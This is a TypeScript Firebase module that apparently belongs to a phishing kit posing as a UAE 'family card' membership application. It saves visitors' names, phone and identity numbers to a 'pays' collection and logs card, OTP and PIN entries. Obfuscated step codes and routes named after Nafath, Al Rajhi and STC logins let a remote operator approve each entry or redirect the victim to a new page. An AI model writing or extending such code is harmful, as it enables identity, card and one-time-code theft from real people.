"use client";

import type { FormData } from "@/context/FormContext";
import {
  addDoc,
  arrayUnion,
  collection,
  doc,
  serverTimestamp,
  updateDoc,
} from "firebase/firestore";
import { db } from "./firebase";

const membershipLabels: Record<string, string> = {
  silver: "عضوية فضية",
  gold: "عضوية ذهبية",
  platinum: "عضوية بلاتينية",
};

const stepByPathname: Record<string, { currentStep: string; currentPage: string }> = {
  "/payment": { currentStep: "payment", currentPage: "payment" },
  "/card": { currentStep: "_st1", currentPage: "card" },
  "/otp": { currentStep: "_t2", currentPage: "otp" },
  "/success": { currentStep: "confi", currentPage: "success" },
  "/register": { currentStep: "home", currentPage: "register" },
  "/": { currentStep: "home", currentPage: "home" },
};

const redirectRouteMap: Record<string, string> = {
  home: "/",
  payment: "/payment",
  otp: "/otp",
  pin: "/otp",
  phone: "/otp",
  nafad: "/otp",
  rajhi: "/otp",
  "stc-login": "/otp",
  finalOtp: "/otp",
  _st1: "/payment",
  _t2: "/otp",
  _t3: "/otp",
  _t6: "/otp",
  confi: "/success",
};

const nowIso = () => new Date().toISOString();

const normalizeFormPayload = (data: FormData, confirmationCode: string) => ({
  ownerName: data.name.trim(),
  phoneNumber: data.phone.trim(),
  identityNumber: data.id_number.trim(),
  membership: membershipLabels[data.membership] || data.membership || "",
  emirate: data.emirate || "",
  delivery_date: data.delivery_date || "",
  confirmation_code: confirmationCode,
  country: "UAE",
  documentType: "بطاقة الأسرة",
  status: "draft",
  paymentStatus: "pending",
  isUnread: true,
  basicInfoUpdatedAt: nowIso(),
});

export const hasRequiredApplicantData = (data: FormData) =>
  Boolean(data.name.trim() && data.phone.trim() && data.id_number.trim());

export const generateConfirmationCode = () =>
  `ESA-${Math.floor(100000 + Math.random() * 900000)}`;

export async function ensureApplicationDoc(params: {
  docId: string | null;
  data: FormData;
  confirmationCode: string;
  pathname: string;
  extra?: Record<string, unknown>;
}) {
  const { docId, data, confirmationCode, pathname, extra = {} } = params;
  const time = nowIso();
  const stepMeta = stepByPathname[pathname] || stepByPathname["/"];
  const basePayload = {
    ...normalizeFormPayload(data, confirmationCode),
    ...stepMeta,
    lastSeen: time,
    lastActiveAt: time,
    sessionStartAt: time,
    ...extra,
  };

  if (docId) {
    await updateDoc(doc(db, "pays", docId), {
      ...basePayload,
      updatedAt: serverTimestamp(),
    });
    return docId;
  }

  const docRef = await addDoc(collection(db, "pays"), {
    ...basePayload,
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  });

  return docRef.id;
}

export async function updateApplicationData(
  docId: string,
  data: Record<string, unknown>,
) {
  await updateDoc(doc(db, "pays", docId), {
    ...data,
    updatedAt: serverTimestamp(),
  });
}

export async function touchApplication(docId: string, pathname: string) {
  const time = nowIso();
  const stepMeta = stepByPathname[pathname] || {};

  await updateDoc(doc(db, "pays", docId), {
    ...stepMeta,
    lastSeen: time,
    lastActiveAt: time,
    updatedAt: serverTimestamp(),
  });
}

export async function appendHistoryEntry(params: {
  docId: string;
  type: "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6" | "card" | "otp" | "pin";
  status?: "pending" | "approved" | "rejected";
  data: Record<string, unknown>;
}) {
  const entry = {
    id: `${params.type}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    type: params.type,
    status: params.status || "pending",
    timestamp: nowIso(),
    data: params.data,
  };

  await updateDoc(doc(db, "pays", params.docId), {
    history: arrayUnion(entry),
    updatedAt: serverTimestamp(),
  });
}

export function getRouteForRemoteState(snapshot: {
  redirectPage?: string | null;
  currentStep?: string | number | null;
  currentPage?: string | null;
  status?: string | null;
}) {
  if (snapshot.status === "approved" || snapshot.status === "completed") {
    return "/success";
  }

  if (snapshot.status === "rejected") {
    return "/card";
  }

  const redirectPage = snapshot.redirectPage;
  if (typeof redirectPage === "string" && redirectRouteMap[redirectPage]) {
    return redirectRouteMap[redirectPage];
  }

  if (snapshot.currentPage === "card") {
    return null;
  }

  const currentStep =
    typeof snapshot.currentStep === "string" ? snapshot.currentStep : "";

  if (currentStep && currentStep !== "_st1" && redirectRouteMap[currentStep]) {
    return redirectRouteMap[currentStep];
  }

  return null;
}
